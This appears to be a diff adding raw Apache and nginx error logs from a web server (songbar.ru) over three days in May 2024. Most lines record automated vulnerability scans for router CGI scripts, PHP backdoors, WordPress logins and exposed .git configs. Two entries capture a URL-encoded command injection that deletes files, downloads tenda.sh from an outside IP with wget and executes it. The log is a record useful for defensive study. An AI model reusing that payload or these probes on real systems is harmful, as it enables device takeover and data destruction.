@@ -1,0 +1,198 @@
+[Fri May 10 10:38:59.078391 2024] [cgi:error] [pid 2448802] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 11:01:44.785318 2024] [cgi:error] [pid 2449645] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 11:21:23.585989 2024] [php:error] [pid 2450336] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Fri May 10 12:08:23.169782 2024] [cgi:error] [pid 2451861] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 12:11:55.571098 2024] [cgi:error] [pid 2452084] [client 84.54.51.41:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 12:44:53.666054 2024] [cgi:error] [pid 2453498] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 12:47:07.236425 2024] [php:error] [pid 2453624] [client 51.81.49.5:0] script '/var/www/www-root/data/www/songbar.ru/index.php' not found or unable to stat
+[Fri May 10 12:47:21.672492 2024] [php:error] [pid 2453684] [client 51.81.49.5:0] script '/var/www/www-root/data/www/songbar.ru/database/index.php' not found or unable to stat
+[Fri May 10 13:43:49.620019 2024] [cgi:error] [pid 2455968] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 15:30:42.899477 2024] [cgi:error] [pid 2460498] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 16:21:57.396527 2024] [cgi:error] [pid 2462269] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 16:48:00.021301 2024] [cgi:error] [pid 2463159] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 17:20:51.013786 2024] [cgi:error] [pid 2464307] [client 80.94.92.60:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/10 17:20:51 [warn] 2447721#2447721: *1080 delaying request, excess: 0.800, by zone "songbar.ru", client: 80.94.92.60, server: songbar.ru, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "5.35.87.162"
+[Fri May 10 17:20:51.049807 2024] [cgi:error] [pid 2464308] [client 80.94.92.60:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 17:50:05.951580 2024] [cgi:error] [pid 2465296] [client 185.180.143.79:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/main.pl
+[Fri May 10 18:01:16.679220 2024] [cgi:error] [pid 2465622] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 18:05:09.133587 2024] [php:error] [pid 2465748] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Fri May 10 19:11:34.285256 2024] [cgi:error] [pid 2468223] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/10 19:55:11 [crit] 2447721#2447721: *1143 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 87.236.176.56, server: 5.35.87.162:443
+[Fri May 10 20:00:46.458098 2024] [php:error] [pid 2470115] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Fri May 10 20:17:03.568692 2024] [cgi:error] [pid 2470697] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 20:19:02.318994 2024] [cgi:error] [pid 2470740] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 20:29:38.619506 2024] [php:error] [pid 2471052] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Fri May 10 20:30:06.951119 2024] [cgi:error] [pid 2471120] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 22:00:11.160701 2024] [php:error] [pid 2474437] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Fri May 10 22:17:58.820732 2024] [cgi:error] [pid 2475109] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Fri May 10 22:52:15.833441 2024] [cgi:error] [pid 2476445] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 00:12:59 [warn] 2447721#2447721: *1311 delaying request, excess: 1.000, by zone "songbar.ru", client: 142.93.100.246, server: songbar.ru, request: "GET /odinhttpcall1715386379 HTTP/1.1", host: "5.35.87.162"
+2024/05/11 00:12:59 [warn] 2447721#2447721: *1314 delaying request, excess: 1.900, by zone "songbar.ru", client: 142.93.100.246, server: songbar.ru, request: "GET / HTTP/1.0"
+[Sat May 11 00:13:08.694842 2024] [cgi:error] [pid 2479421] [client 142.93.105.179:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/authLogin.cgi
+[Sat May 11 00:23:47.735198 2024] [php:error] [pid 2480057] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+2024/05/11 00:33:54 [crit] 2447721#2447721: *1350 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 167.99.86.218, server: 5.35.87.162:443
+2024/05/11 00:34:08 [crit] 2447721#2447721: *1360 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 167.99.86.218, server: 5.35.87.162:443
+2024/05/11 00:44:19 [warn] 2447721#2447721: *1365 delaying request, excess: 0.900, by zone "songbar.ru", client: 64.225.105.129, server: songbar.ru, request: "GET /odinhttpcall1715388259 HTTP/1.1", host: "5.35.87.162"
+2024/05/11 00:44:19 [warn] 2447721#2447721: *1366 delaying request, excess: 1.900, by zone "songbar.ru", client: 64.225.105.129, server: songbar.ru, request: "GET / HTTP/1.0"
+2024/05/11 00:59:56 [crit] 2447721#2447721: *1401 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 167.248.133.183, server: 5.35.87.162:443
+[Sat May 11 01:07:19.148645 2024] [cgi:error] [pid 2482541] [client 157.230.103.49:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/authLogin.cgi
+[Sat May 11 01:21:14.248387 2024] [php:error] [pid 2483269] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sat May 11 01:29:37.250294 2024] [cgi:error] [pid 2483511] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 01:39:28 [crit] 2447721#2447721: *1451 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 212.102.40.218, server: 5.35.87.162:443
+[Sat May 11 01:49:57.737188 2024] [php:error] [pid 2484215] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+2024/05/11 02:00:27 [crit] 2447721#2447721: *1473 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 212.102.40.218, server: 5.35.87.162:443
+[Sat May 11 02:14:16.673806 2024] [cgi:error] [pid 2485390] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 03:35:30 [crit] 2447721#2447721: *1528 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 207.90.244.6, server: 5.35.87.162:443
+2024/05/11 03:37:38 [crit] 2447721#2447721: *1557 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 104.152.52.133, server: 5.35.87.162:443
+[Sat May 11 03:39:45.773627 2024] [cgi:error] [pid 2488926] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 03:49:08 [warn] 2447721#2447721: *1566 delaying request, excess: 0.300, by zone "songbar.ru", client: 62.128.217.78, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162"
+[Sat May 11 03:49:11.040190 2024] [php:error] [pid 2489453] [client 62.128.217.78:0] script '/var/www/www-root/data/www/songbar.ru/main.php' not found or unable to stat, referer: http://5.35.87.162/
+[Sat May 11 03:51:16.345128 2024] [php:error] [pid 2489735] [client 62.128.217.78:0] script '/var/www/www-root/data/www/songbar.ru/main.php' not found or unable to stat, referer: https://5.35.87.162/
+[Sat May 11 05:52:48.235983 2024] [cgi:error] [pid 2494540] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 05:56:55.631866 2024] [cgi:error] [pid 2494654] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 06:09:03.692790 2024] [php:error] [pid 2495011] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sat May 11 06:37:43.959120 2024] [php:error] [pid 2496384] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sat May 11 06:38:37.159445 2024] [cgi:error] [pid 2496401] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 07:09:40 [crit] 2447721#2447721: *2373 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 168.76.20.229, server: 5.35.87.162:443
+[Sat May 11 08:29:12.866066 2024] [cgi:error] [pid 2500624] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 09:31:44.173821 2024] [php:error] [pid 2502696] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+2024/05/11 10:48:02 [crit] 2447721#2447721: *2422 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 216.218.206.68, server: 5.35.87.162:443
+[Sat May 11 11:01:42.014098 2024] [cgi:error] [pid 2507586] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 11:27:05.460897 2024] [cgi:error] [pid 2508419] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 11:27:39.371438 2024] [php:error] [pid 2508421] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2466 delaying request, excess: 0.900, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /robots.txt HTTP/1.1", host: "5.35.87.162:80"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2472 delaying request, excess: 1.900, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /99vt HTTP/1.1", host: "5.35.87.162:80"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2469 delaying request, excess: 2.900, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:80"
+2024/05/11 11:53:27 [warn] 2447722#2447722: *2477 delaying request, excess: 3.700, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1", host: "5.35.87.162:80"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2480 delaying request, excess: 4.400, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /gate.php HTTP/1.1", host: "5.35.87.162:80"
+[Sat May 11 11:53:27.466873 2024] [php:error] [pid 2509213] [client 54.91.83.124:0] script '/var/www/www-root/data/www/songbar.ru/gate.php' not found or unable to stat
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2467 delaying request, excess: 1.000, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:443"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2470 delaying request, excess: 2.000, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /robots.txt HTTP/1.1", host: "5.35.87.162:443"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2473 delaying request, excess: 2.900, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /aaaaaaaaaaaaaaaaaaaaaaaaaqr HTTP/1.1", host: "5.35.87.162:443"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2481 delaying request, excess: 3.800, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /Res/login.html HTTP/1.1", host: "5.35.87.162:443"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2485 delaying request, excess: 4.700, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /exec HTTP/1.1", host: "5.35.87.162:443"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2486 delaying request, excess: 5.700, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /%25 HTTP/1.1", host: "5.35.87.162:443"
+2024/05/11 11:53:27 [warn] 2447721#2447721: *2479 delaying request, excess: 6.700, by zone "songbar.ru", client: 54.91.83.124, server: songbar.ru, request: "GET /99vt HTTP/1.1", host: "5.35.87.162:443"
+[Sat May 11 13:07:00.047626 2024] [cgi:error] [pid 2511860] [client 159.203.73.253:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 13:57:00 [crit] 2447721#2447721: *2642 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 167.248.133.53, server: 5.35.87.162:443
+[Sat May 11 14:11:09.538874 2024] [cgi:error] [pid 2514755] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 15:23:39.907412 2024] [cgi:error] [pid 2516805] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 16:06:38.228891 2024] [cgi:error] [pid 2517973] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 16:11:37.405725 2024] [cgi:error] [pid 2518199] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 17:49:29.520728 2024] [cgi:error] [pid 2522238] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 18:26:54 [warn] 2447721#2447721: *2737 an upstream response is buffered to a temporary file /var/lib/nginx/proxy/2/00/0000000002 while reading upstream, client: 83.147.52.42, server: songbar.ru, request: "GET /public/.git/config HTTP/1.1", upstream: "http://127.0.0.1:8081/public/.git/config", host: "5.35.87.162"
+[Sat May 11 18:45:06.438174 2024] [cgi:error] [pid 2524077] [client 80.94.92.60:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 18:45:06 [warn] 2447721#2447721: *2747 delaying request, excess: 0.900, by zone "songbar.ru", client: 80.94.92.60, server: songbar.ru, request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F94.156.8.244%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1", host: "5.35.87.162"
+[Sat May 11 18:45:06.478221 2024] [cgi:error] [pid 2524078] [client 80.94.92.60:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/11 19:05:26 [crit] 2447721#2447721: *2770 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 212.192.158.74, server: 5.35.87.162:443
+2024/05/11 19:18:37 [crit] 2447721#2447721: *2806 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 95.143.191.223, server: 5.35.87.162:443
+[Sat May 11 19:51:35.430382 2024] [php:error] [pid 2526940] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sat May 11 20:03:28.362092 2024] [php:error] [pid 2527249] [client 170.64.222.129:0] script '/var/www/www-root/data/www/songbar.ru/alive.php' not found or unable to stat
+2024/05/11 20:03:37 [crit] 2447721#2447721: *2846 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 170.64.222.129, server: 5.35.87.162:443
+[Sat May 11 20:50:20.580633 2024] [php:error] [pid 2529069] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sat May 11 20:58:52.747352 2024] [cgi:error] [pid 2529232] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sat May 11 21:49:23.946650 2024] [php:error] [pid 2530832] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sat May 11 22:00:33.281138 2024] [php:error] [pid 2531155] [client 104.211.2.187:0] script '/var/www/www-root/data/www/songbar.ru/wp-login.php' not found or unable to stat
+[Sat May 11 23:22:09.519378 2024] [php:error] [pid 2533550] [client 157.254.164.70:0] script '/var/www/www-root/data/www/songbar.ru/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' not found or unable to stat
+[Sun May 12 00:06:34.182310 2024] [cgi:error] [pid 2535414] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 00:14:53.442615 2024] [php:error] [pid 2535730] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+2024/05/12 00:49:47 [crit] 2447721#2447721: *2947 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 13.91.165.243, server: 5.35.87.162:443
+[Sun May 12 01:13:11.018113 2024] [php:error] [pid 2537845] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sun May 12 01:42:22.689885 2024] [php:error] [pid 2538791] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sun May 12 02:03:11.206144 2024] [cgi:error] [pid 2539334] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 02:23:49.442787 2024] [cgi:error] [pid 2539965] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/12 04:15:48 [crit] 2447721#2447721: *3022 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 164.52.25.203, server: 5.35.87.162:443
+[Sun May 12 04:23:03.638725 2024] [cgi:error] [pid 2544899] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 04:41:07.054997 2024] [cgi:error] [pid 2545789] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 05:01:32.359115 2024] [cgi:error] [pid 2546602] [client 84.54.51.41:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 06:12:41.199952 2024] [cgi:error] [pid 2549690] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 06:20:25.028005 2024] [cgi:error] [pid 2550000] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 07:56:25.088323 2024] [php:error] [pid 2552895] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sun May 12 08:02:53.704770 2024] [cgi:error] [pid 2553057] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/12 08:03:16 [warn] 2447721#2447721: *3119 delaying request, excess: 1.000, by zone "songbar.ru", client: 50.31.21.9, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162"
+2024/05/12 08:26:51 [crit] 2447721#2447721: *3145 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 74.82.47.4, server: 5.35.87.162:443
+[Sun May 12 09:46:44.314953 2024] [cgi:error] [pid 2556149] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 10:14:27.365351 2024] [cgi:error] [pid 2557783] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/12 10:24:16 [crit] 2447721#2447721: *3188 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 154.212.141.141, server: 5.35.87.162:443
+[Sun May 12 10:51:20.549384 2024] [php:error] [pid 2558887] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sun May 12 12:16:25.970703 2024] [cgi:error] [pid 2562405] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 12:16:49.234972 2024] [cgi:error] [pid 2562408] [client 45.156.128.7:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/authLogin.cgi
+[Sun May 12 12:28:42.283364 2024] [cgi:error] [pid 2562764] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 12:47:24.138113 2024] [php:error] [pid 2563575] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+2024/05/12 12:59:04 [warn] 2447721#2447721: *3305 delaying request, excess: 0.900, by zone "songbar.ru", client: 46.60.32.130, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:80"
+2024/05/12 12:59:04 [warn] 2447721#2447721: *3307 delaying request, excess: 1.900, by zone "songbar.ru", client: 46.60.32.130, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:80"
+2024/05/12 12:59:04 [warn] 2447721#2447721: *3306 delaying request, excess: 2.900, by zone "songbar.ru", client: 46.60.32.130, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:80"
+2024/05/12 12:59:04 [warn] 2447721#2447721: *3308 delaying request, excess: 3.900, by zone "songbar.ru", client: 46.60.32.130, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:80"
+2024/05/12 12:59:04 [warn] 2447721#2447721: *3309 delaying request, excess: 4.900, by zone "songbar.ru", client: 46.60.32.130, server: songbar.ru, request: "GET / HTTP/1.1", host: "5.35.87.162:80"
+2024/05/12 13:08:57 [crit] 2447721#2447721: *3335 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 118.193.32.88, server: 5.35.87.162:443
+[Sun May 12 13:14:59.633975 2024] [cgi:error] [pid 2564356] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 13:57:56.162994 2024] [cgi:error] [pid 2565768] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 14:03:10.733777 2024] [cgi:error] [pid 2566796] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 14:27:10.744856 2024] [cgi:error] [pid 2567679] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 15:42:21.974519 2024] [cgi:error] [pid 2569995] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 15:57:52.302027 2024] [cgi:error] [pid 2570367] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 15:58:30.052463 2024] [cgi:error] [pid 2570381] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 16:19:51.871748 2024] [cgi:error] [pid 2571021] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 16:41:11.016572 2024] [cgi:error] [pid 2571716] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 17:18:10.977993 2024] [cgi:error] [pid 2572780] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 17:26:44.915907 2024] [cgi:error] [pid 2572987] [client 89.190.156.248:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/nas_sharing.cgi
+[Sun May 12 17:33:31.753917 2024] [cgi:error] [pid 2573147] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/12 17:55:57 [crit] 2447721#2447721: *3464 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 71.6.165.200, server: 5.35.87.162:443
+[Sun May 12 18:03:44.124224 2024] [cgi:error] [pid 2574004] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 18:05:50.325518 2024] [cgi:error] [pid 2574077] [client 84.54.51.41:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/12 18:13:31 [crit] 2447721#2447721: *3505 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 168.76.20.229, server: 5.35.87.162:443
+[Sun May 12 18:33:23.381639 2024] [cgi:error] [pid 2574872] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 18:37:01.505221 2024] [php:error] [pid 2574974] [client 103.14.26.206:0] script '/var/www/www-root/data/www/songbar.ru/restore.php' not found or unable to stat
+[Sun May 12 19:00:04.817960 2024] [cgi:error] [pid 2575679] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 19:26:00.984228 2024] [cgi:error] [pid 2576421] [client 195.1.144.109:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 19:26:07.341719 2024] [cgi:error] [pid 2576435] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 20:12:51.572989 2024] [cgi:error] [pid 2577798] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 20:23:45.615490 2024] [cgi:error] [pid 2578063] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+2024/05/12 20:31:48 [crit] 2447721#2447721: *3588 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 13.91.177.235, server: 5.35.87.162:443
+[Sun May 12 20:57:05.396478 2024] [cgi:error] [pid 2579271] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 20:59:51.530265 2024] [cgi:error] [pid 2579362] [client 183.81.169.139:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 21:33:44.777120 2024] [cgi:error] [pid 2580429] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 21:48:26.423233 2024] [cgi:error] [pid 2580912] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 22:11:28.463335 2024] [php:error] [pid 2581822] [client 172.234.28.219:0] script '/var/www/www-root/data/www/songbar.ru/alive.php' not found or unable to stat
+2024/05/12 22:11:33 [crit] 2447721#2447721: *3625 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 172.234.28.219, server: 5.35.87.162:443
+[Sun May 12 22:20:58.980073 2024] [cgi:error] [pid 2582134] [client 185.191.126.213:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 22:21:09.627826 2024] [cgi:error] [pid 2582151] [client 84.54.51.37:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
+[Sun May 12 22:41:42.624481 2024] [cgi:error] [pid 2582928] [client 45.128.232.107:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/nas_sharing.cgi
+[Sun May 12 22:50:19.677364 2024] [cgi:error] [pid 2583215] [client 31.220.1.83:0] AH02811: script not found or unable to stat: /usr/lib/cgi-bin/luci
